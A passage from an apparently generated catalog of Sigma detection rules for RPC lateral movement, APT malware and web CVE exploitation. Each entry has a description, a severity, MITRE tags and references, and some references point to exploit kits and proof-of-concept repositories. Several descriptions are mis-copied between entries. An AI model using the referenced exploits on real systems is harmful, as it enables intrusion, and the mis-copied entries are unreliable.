    Generic rule for SQL exceptions in Python according to PEP 249

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/python/app_python_sql_exceptions.yml
* https://www.python.org/dev/peps/pep-0249/#exceptions

    
### Remote Encrypting File System Abuse
    
    Detects remote RPC calls to possibly abuse remote encryption service via MS-EFSR

    * Level: high
    * MITRE: attack.lateral_movement
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/rpc_firewall/rpc_firewall_efs_abuse.yml
* https://attack.mitre.org/tactics/TA0008/

* https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942

* https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-EFSR.md

* https://github.com/zeronetworks/rpcfirewall

* https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/

    
### Remote Event Log Recon
    
    Detects remote RPC calls to get event log information via EVEN or EVEN6

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/rpc_firewall/rpc_firewall_eventlog_recon.yml
* https://attack.mitre.org/tactics/TA0007/

* https://github.com/zeronetworks/rpcfirewall

* https://github.com/zeronetworks/rpcfirewall

* https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/

    
### Remote Schedule Task Lateral Movement via ATSvc
    
    Detects remote RPC calls to create or execute a scheduled task via ATSvc

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1053
    * MITRE: attack.t1053.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/rpc_firewall/rpc_firewall_atsvc_lateral_movement.yml
* https://attack.mitre.org/techniques/T1053/

* https://attack.mitre.org/tactics/TA0008/

* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931

* https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-TSCH.md

* https://github.com/zeronetworks/rpcfirewall

* https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/

    
### Remote DCOM/WMI Lateral Movement
    
    Detects remote RPC calls that performs remote DCOM operations. These could be abused for lateral movement via DCOM or WMI.

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.003
    * MITRE: attack.t1047
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/rpc_firewall/rpc_firewall_remote_dcom_or_wmi.yml
* https://attack.mitre.org/tactics/TA0008/

* https://attack.mitre.org/techniques/T1021/003/

* https://attack.mitre.org/techniques/T1047/

* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/accf23b0-0f57-441c-9185-43041f1b0ee9

* https://github.com/zeronetworks/rpcfirewall

* https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/

    
### Remote Registry Recon
    
    Detects remote RPC calls to collect information

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/rpc_firewall/rpc_firewall_remote_registry_recon.yml
* https://attack.mitre.org/tactics/TA0007/

* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78

* https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-RRP.md

* https://github.com/zeronetworks/rpcfirewall

* https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/

    
### SharpHound Recon Account Discovery
    
    Detects remote RPC calls useb by SharpHound to map remote connections and local group membership.

    * Level: high
    * MITRE: attack.t1087
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/rpc_firewall/rpc_firewall_sharphound_recon_account.yml
* https://attack.mitre.org/techniques/T1087/

* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wkst/55118c55-2122-4ef9-8664-0c1ff9e168f3

* https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-WKST.md

* https://github.com/zeronetworks/rpcfirewall

* https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/

    
### SharpHound Recon Sessions
    
    Detects remote RPC calls useb by SharpHound to map remote connections and local group membership.

    * Level: high
    * MITRE: attack.t1033
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/rpc_firewall/rpc_firewall_sharphound_recon_sessions.yml
* https://attack.mitre.org/techniques/T1033/

* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/02b1f559-fda2-4ba3-94c2-806eb2777183

* https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-SRVS.md

* https://github.com/zeronetworks/rpcfirewall

* https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/

    
### Remote Schedule Task Recon via AtScv
    
    Detects remote RPC calls to read information about scheduled tasks via AtScv

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/rpc_firewall/rpc_firewall_atsvc_recon.yml
* https://attack.mitre.org/tactics/TA0007/

* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931

* https://github.com/zeronetworks/rpcfirewall

* https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-TSCH.md

* https://github.com/zeronetworks/rpcfirewall

* https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/

    
### Remote Registry Lateral Movement
    
    Detects remote RPC calls to modify the registry and possible execute code

    * Level: high
    * MITRE: attack.lateral_movement
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/rpc_firewall/rpc_firewall_remote_registry_lateral_movement.yml
* https://attack.mitre.org/techniques/T1112/

* https://attack.mitre.org/tactics/TA0008/

* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78

* https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-RRP.md

* https://github.com/zeronetworks/rpcfirewall

* https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/

    
### Remote Server Service Abuse for Lateral Movement
    
    Detects remote RPC calls to possibly abuse remote encryption service via MS-EFSR

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1569.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/rpc_firewall/rpc_firewall_remote_service_lateral_movement.yml
* https://attack.mitre.org/tactics/TA0008/

* https://attack.mitre.org/techniques/T1569/002/

* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/accf23b0-0f57-441c-9185-43041f1b0ee9

* https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-SCMR.md

* https://github.com/zeronetworks/rpcfirewall

* https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/

    
### Remote Schedule Task Recon via ITaskSchedulerService
    
    Detects remote RPC calls to read information about scheduled tasks

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/rpc_firewall/rpc_firewall_itaskschedulerservice_recon.yml
* https://attack.mitre.org/tactics/TA0007/

* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931

* https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-TSCH.md

* https://github.com/zeronetworks/rpcfirewall

* https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/

    
### Remote Printing Abuse for Lateral Movement
    
    Detects remote RPC calls to possibly abuse remote printing service via MS-RPRN / MS-PAR

    * Level: high
    * MITRE: attack.lateral_movement
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/rpc_firewall/rpc_firewall_printing_lateral_movement.yml
* https://attack.mitre.org/tactics/TA0008/

* https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527

* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1

* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pan/e44d984c-07d3-414c-8ffc-f8c8ad8512a8

* https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-RPRN-PAR.md

* https://github.com/zeronetworks/rpcfirewall

* https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/

    
### Possible DCSync Attack
    
    Detects remote RPC calls to MS-DRSR from non DC hosts, which could indicate DCSync / DCShadow attacks.

    * Level: high
    * MITRE: attack.t1033
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/rpc_firewall/rpc_firewall_dcsync_attack.yml
* https://attack.mitre.org/techniques/T1033/

* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47?redirectedfrom=MSDN

* https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-DRSR.md

* https://github.com/zeronetworks/rpcfirewall

* https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/

    
### Remote Schedule Task Lateral Movement via SASec
    
    Detects remote RPC calls to read information about scheduled tasks via SASec

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/rpc_firewall/rpc_firewall_sasec_recon.yml
* https://attack.mitre.org/tactics/TA0007/

* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931

* https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-TSCH.md

* https://github.com/zeronetworks/rpcfirewall

* https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/

    
### Remote Server Service Abuse
    
    Detects remote RPC calls to possibly abuse remote encryption service via MS-SRVS

    * Level: high
    * MITRE: attack.lateral_movement
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/rpc_firewall/rpc_firewall_remote_server_service_abuse.yml
* https://attack.mitre.org/tactics/TA0008/

* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/accf23b0-0f57-441c-9185-43041f1b0ee9

* https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-SRVS.md

* https://github.com/zeronetworks/rpcfirewall

* https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/

    
### Remote Schedule Task Lateral Movement via ITaskSchedulerService
    
    Detects remote RPC calls to create or execute a scheduled task

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1053
    * MITRE: attack.t1053.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/rpc_firewall/rpc_firewall_itaskschedulerservice_lateral_movement.yml
* https://attack.mitre.org/techniques/T1053/

* https://attack.mitre.org/tactics/TA0008/

* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931

* https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-TSCH.md

* https://github.com/zeronetworks/rpcfirewall

* https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/

    
### Remote Schedule Task Lateral Movement via SASec
    
    Detects remote RPC calls to create or execute a scheduled task via SASec

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1053
    * MITRE: attack.t1053.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/application/rpc_firewall/rpc_firewall_sasec_lateral_movement.yml
* https://attack.mitre.org/techniques/T1053/

* https://attack.mitre.org/tactics/TA0008/

* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931

* https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/main/documents/MS-TSCH.md

* https://github.com/zeronetworks/rpcfirewall

* https://zeronetworks.com/blog/stopping_lateral_movement_via_the_rpc_firewall/

    
### Silence.EDA Detection
    
    Detects Silence empireDNSagent

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071.004
    * MITRE: attack.t1572
    * MITRE: attack.impact
    * MITRE: attack.t1529
    * MITRE: attack.g0091
    * MITRE: attack.s0363
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/apt/apt_silence_eda.yml
    
### Silence.Downloader V3
    
    Detects Silence downloader. These commands are hardcoded into the binary.

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    * MITRE: attack.discovery
    * MITRE: attack.t1057
    * MITRE: attack.t1082
    * MITRE: attack.t1016
    * MITRE: attack.t1033
    * MITRE: attack.g0091
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/apt/apt_silence_downloader_v3.yml
    
### JNDIExploit Pattern
    
    Detects exploitation attempt using the JDNIExploiit Kit

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_jndi_exploit.yml
* https://github.com/pimps/JNDI-Exploit-Kit

* https://githubmemory.com/repo/FunctFan/JNDIExploit

    
### ADSelfService Exploitation
    
    Detects suspicious access to URLs that was noticed in cases in which attackers exploitated the ADSelfService vulnerability CVE-2021-40539

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_cve_2021_40539_adselfservice.yml
* https://us-cert.cisa.gov/ncas/alerts/aa21-259a

    
### CVE-2020-10148 SolarWinds Orion API Auth Bypass
    
    Detects CVE-2020-10148 SolarWinds Orion API authentication bypass attempts

    * Level: critical
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_solarwinds_cve_2020_10148.yml
* https://kb.cert.org/vuls/id/843464

    
### VMware vCenter Server File Upload CVE-2021-22005
    
    Detects exploitation attempts using file upload vulnerability CVE-2021-22005 in the VMWare vCenter Server.

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_cve_2021_22005_vmware_file_upload.yml
* https://kb.vmware.com/s/article/85717

* https://www.tenable.com/blog/cve-2021-22005-critical-file-upload-vulnerability-in-vmware-vcenter-server

    
### Oracle WebLogic Exploit CVE-2021-2109
    
    Detects the exploitation of the WebLogic server vulnerability described in CVE-2021-2109

    * Level: critical
    * MITRE: attack.t1190
    * MITRE: attack.initial_access
    * MITRE: cve.2021.2109
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_cve_2021_2109_weblogic_rce_exploit.yml
* https://twitter.com/pyn3rd/status/1351696768065409026

* https://mp.weixin.qq.com/s/wX9TMXl1KVWwB_k6EZOklw

    
### Pulse Secure Attack CVE-2019-11510
    
    Detects CVE-2019-11510 exploitation attempt - URI contains Guacamole

    * Level: critical
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_pulsesecure_cve_2019_11510.yml
* https://www.exploit-db.com/exploits/47297

    
### DEWMODE Webshell Access
    
    Detects access to DEWMODE webshell as described in FIREEYE report

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.t1505.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_unc2546_dewmode_php_webshell.yml
* https://www.fireeye.com/blog/threat-research/2021/02/accellion-fta-exploited-for-data-theft-and-extortion.html

    
### Apache Segmentation Fault
    
    Detects a segmentation fault error message caused by a creashing apache worker process

    * Level: high
    * MITRE: attack.impact
    * MITRE: attack.t1499.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_apache_segfault.yml
* http://www.securityfocus.com/infocus/1633

    
### Grafana Path Traversal Exploitation CVE-2021-43798
    
    Detects a successful Grafana path traversal exploitation

    * Level: critical
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_cve_2021_43798_grafana.yml
* https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/

* https://github.com/search?q=CVE-2021-43798

    
### Apache Threading Error
    
    Detects an issue in apache logs that reports threading related errors

    * Level: medium
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_apache_threading_error.yml
* https://github.com/hannob/apache-uaf/blob/master/README.md

    
### Log4j RCE CVE-2021-44228 in Fields
    
    Detects exploitation attempt against log4j RCE vulnerability reported as CVE-2021-44228 in different header fields found in web server logs (Log4Shell)

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_cve_2021_44228_log4j_fields.yml
* https://www.lunasec.io/docs/blog/log4j-zero-day/

* https://news.ycombinator.com/item?id=29504755

* https://github.com/tangxiaofeng7/apache-log4j-poc

* https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b

* https://github.com/YfryTchsGD/Log4jAttackSurface

* https://twitter.com/shutingrz/status/1469255861394866177?s=21

    
### Pulse Connect Secure RCE Attack CVE-2021-22893
    
    This rule detects exploitation attempts using Pulse Connect Secure(PCS) vulnerability (CVE-2021-22893)

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_cve_2021_22893_pulse_secure_rce_exploit.yml
* https://www.fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html

* https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44784

    
### Log4j RCE CVE-2021-44228 Generic
    
    Detects exploitation attempt against log4j RCE vulnerability reported as CVE-2021-44228 (Log4Shell)

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_cve_2021_44228_log4j.yml
* https://www.lunasec.io/docs/blog/log4j-zero-day/

* https://news.ycombinator.com/item?id=29504755

* https://github.com/tangxiaofeng7/apache-log4j-poc

* https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b

* https://github.com/YfryTchsGD/Log4jAttackSurface

* https://twitter.com/shutingrz/status/1469255861394866177?s=21

    
### ProxyLogon Reset Virtual Directories Based On IIS Log
    
    When exploiting this vulnerability with CVE-2021–26858, an SSRF attack is used to manipulate virtual directories

    * Level: critical
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_cve_2021_26858_iis_rce.yml
* https://bi-zone.medium.com/hunting-down-ms-exchange-attacks-part-1-proxylogon-cve-2021-26855-26858-27065-26857-6e885c5f197c

    
### Fortinet CVE-2021-22123 Exploitation
    
    Detects CVE-2021-22123 exploitation attempt against Fortinet WAFs

    * Level: critical
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_fortinet_cve_2021_22123_exploit.yml
* https://www.rapid7.com/blog/post/2021/08/17/fortinet-fortiweb-os-command-injection

    
### Exchange ProxyShell Pattern
    
    Detects URL patterns that could be found in ProxyShell exploitation attempts against Exchange servers (failed and successful)

    * Level: medium
    * MITRE: attack.initial_access
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_exchange_proxyshell.yml
* https://youtu.be/5mqid-7zp8k?t=2231

* https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html

* https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1

    
### Exchange PowerShell Snap-Ins Used by HAFNIUM
    
    Detects adding and using Exchange PowerShell snap-ins to export mailbox data by HAFNIUM

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.collection
    * MITRE: attack.t1114
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/win_powershell_snapins_hafnium.yml
* https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/

* https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/

    
### Oracle WebLogic Exploit
    
    Detects access to a webshell dropped into a keystore folder on the WebLogic server

    * Level: critical
    * MITRE: attack.t1190
    * MITRE: attack.initial_access
    * MITRE: attack.persistence
    * MITRE: attack.t1505.003
    * MITRE: cve.2018.2894
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_cve_2018_2894_weblogic_exploit.yml
* https://twitter.com/pyn3rd/status/1020620932967223296

* https://github.com/LandGrey/CVE-2018-2894

    
### SonicWall SSL/VPN Jarrewrite Exploit
    
    Detects exploitation attempts of the SonicWall Jarrewrite Exploit

    * Level: high
    * MITRE: attack.t1190
    * MITRE: attack.initial_access
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_sonicwall_jarrewrite_exploit.yml
* https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/

    
### CVE-2021-21978 Exploitation Attempt
    
    Detects the exploitation of the VMware View Planner vulnerability described in CVE-2021-21978

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    * MITRE: cve.2021.21978
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_cve_2021_21978_vmware_view_planner_exploit.yml
* https://twitter.com/wugeej/status/1369476795255320580

* https://paper.seebug.org/1495/

    
### Oracle WebLogic Exploit CVE-2020-14882
    
    Detects exploitation attempts on WebLogic servers

    * Level: high
    * MITRE: attack.t1190
    * MITRE: attack.initial_access
    * MITRE: cve.2020.14882
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_cve_2020_14882_weblogic_exploit.yml
* https://isc.sans.edu/diary/26734

* https://twitter.com/jas502n/status/1321416053050667009?s=20

* https://twitter.com/sudo_sudoka/status/1323951871078223874

    
### Successful IIS Shortname Fuzzing Scan
    
    When IIS uses an old .Net Framework it's possible to enumeration folder with the symbol ~.

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_iis_tilt_shortname_scan.yml
* https://github.com/projectdiscovery/nuclei-templates/blob/master/fuzzing/iis-shortname.yaml

* https://www.exploit-db.com/exploits/19525

* https://github.com/lijiejie/IIS_shortname_Scanner

    
### Cisco ASA FTD Exploit CVE-2020-3452
    
    Detects exploitation attempts on Cisco ASA FTD systems exploiting CVE-2020-3452 with a status code of 200 (sccessful exploitation)

    * Level: high
    * MITRE: attack.t1190
    * MITRE: attack.initial_access
    * MITRE: cve.2020.3452
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_cve_2020_3452_cisco_asa_ftd.yml
* https://twitter.com/aboul3la/status/1286012324722155525

* https://github.com/darklotuskdb/CISCO-CVE-2020-3452-Scanner-Exploiter

    
### Confluence Exploitation CVE-2019-3398
    
    Detects the exploitation of the Confluence vulnerability described in CVE-2019-3398

    * Level: critical
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_cve_2019_3398_confluence.yml
* https://devcentral.f5.com/s/articles/confluence-arbitrary-file-write-via-path-traversal-cve-2019-3398-34181

    
### Detect XSS Attempts By Keywords
    
    Detects XSS that use GET requests by keyword searches in URL strings

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/xss_keywords.yml
    
### Detect Sql Injection By Keywords
    
    Detects sql injection that use GET requests by keyword searches in URL strings

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/sql_injection_keywords.yml
    
### CVE-2021-21972 VSphere Exploitation
    
    Detects the exploitation of VSphere Remote Code Execution vulnerability as described in CVE-2021-21972

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_vsphere_cve_2021_21972_unauth_rce_exploit.yml
* https://www.vmware.com/security/advisories/VMSA-2021-0002.html

* https://f5.pm/go-59627.html

* https://swarm.ptsecurity.com/unauth-rce-vmware

    
### TerraMaster TOS CVE-2020-28188
    
    Detects the exploitation of the TerraMaster TOS vulnerability described in CVE-2020-28188

    * Level: critical
    * MITRE: attack.t1190
    * MITRE: attack.initial_access
    * MITRE: cve.2020.28188
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_terramaster_cve_2020_28188_rce_exploit.yml
* https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/

* https://research.checkpoint.com/2021/freakout-leveraging-newest-vulnerabilities-for-creating-a-botnet/

    
### Citrix ADS Exploitation CVE-2020-8193 CVE-2020-8195
    
    Detects exploitation attempt against Citrix Netscaler, Application Delivery Controller (ADS) and Citrix Gateway exploiting vulnerabilities reported as CVE-2020-8193 and CVE-2020-8195

    * Level: critical
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_citrix_cve_2020_8193_8195_exploit.yml
* https://support.citrix.com/article/CTX276688

* https://research.nccgroup.com/2020/07/10/rift-citrix-adc-vulnerabilities-cve-2020-8193-cve-2020-8195-and-cve-2020-8196-intelligence/

* https://dmaasland.github.io/posts/citrix.html

    
### Exchange Exploitation Used by HAFNIUM
    
    Detects exploitation attempts in Exchange server logs as described in blog posts reporting on HAFNIUM group activity

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_exchange_exploitation_hafnium.yml
* https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/

* https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/

    
### CVE-2021-41773 Exploitation Attempt
    
    Detects exploitation of flaw in path normalization in Apache HTTP server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by "require all denied" these requests can succeed. Additionally this flaw could leak the source of interpreted files like CGI scripts. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions.

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_cve_2021_41773_apache_path_traversal.yml
* https://nvd.nist.gov/vuln/detail/CVE-2021-41773

* https://github.com/apache/httpd/commit/e150697086e70c552b2588f369f2d17815cb1782

* https://twitter.com/ptswarm/status/1445376079548624899

* https://twitter.com/h4x0r_dz/status/1445401960371429381

* https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-41773.yaml

* https://twitter.com/bl4sty/status/1445462677824761878

    
### Arcadyan Router Exploitations
    
    Detects exploitation of vulnerabilities in Arcadyan routers as reported in CVE-2021-20090 and CVE-2021-20091.

    * Level: critical
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    * MITRE: cve.2021.20090
    * MITRE: cve.2021.20091
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_arcadyan_router_cve_2021_20090_2021_20091_exploit.yml
* https://medium.com/tenable-techblog/bypassing-authentication-on-arcadyan-routers-with-cve-2021-20090-and-rooting-some-buffalo-ea1dd30980c2

* https://www.tenable.com/security/research/tra-2021-13

* https://blogs.juniper.net/en-us/security/freshly-disclosed-vulnerability-cve-2021-20090-exploited-in-the-wild

    
### CVE-2021-40539 Zoho ManageEngine ADSelfService Plus Exploit
    
    Detects an authentication bypass vulnerability affecting the REST API URLs in ADSelfService Plus (CVE-2021-40539).

    * Level: critical
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    * MITRE: attack.persistence
    * MITRE: attack.t1505.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_cve_2021_40539_manageengine_adselfservice_exploit.yml
* https://therecord.media/cisa-warns-of-zoho-server-zero-day-exploited-in-the-wild/

* https://www.manageengine.com/products/self-service-password/kb/how-to-fix-authentication-bypass-vulnerability-in-REST-API.html

* https://us-cert.cisa.gov/ncas/alerts/aa21-259a

    
### Exchange Exploitation CVE-2021-28480
    
    Detects successful exploitation of Exchange vulnerability as reported in CVE-2021-28480

    * Level: critical
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_expl_exchange_cve_2021_28480.yml
* https://twitter.com/GossiTheDog/status/1392965209132871683?s=20

    
### Source Code Enumeration Detection by Keyword
    
    Detects source code enumeration that use GET requests by keyword searches in URL strings

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1083
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_source_code_enumeration.yml
* https://pentester.land/tutorials/2018/10/25/source-code-disclosure-via-exposed-git-folder.html

* https://medium.com/@logicbomb_1/bugbounty-how-i-was-able-to-download-the-source-code-of-indias-largest-telecom-service-52cf5c5640a1

    
### Sitecore Pre-Auth RCE CVE-2021-42237
    
    Detects exploitation attempts of Sitecore Experience Platform Pre-Auth RCE CVE-2021-42237 found in Report.ashx

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_cve_2021_42237_sitecore_report_ashx.yml
* https://blog.assetnote.io/2021/11/02/sitecore-rce/

* https://support.sitecore.com/kb?id=kb_article_view&sysparm_article=KB1000776

    
### Path Traversal Exploitation Attempts
    
    Detects path traversal exploitation attempts

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/web/web_path_traversal_exploitation_attempt.yml
* https://github.com/projectdiscovery/nuclei-templates

    
### Multiple Suspicious Resp Codes Caused by Single Client
    
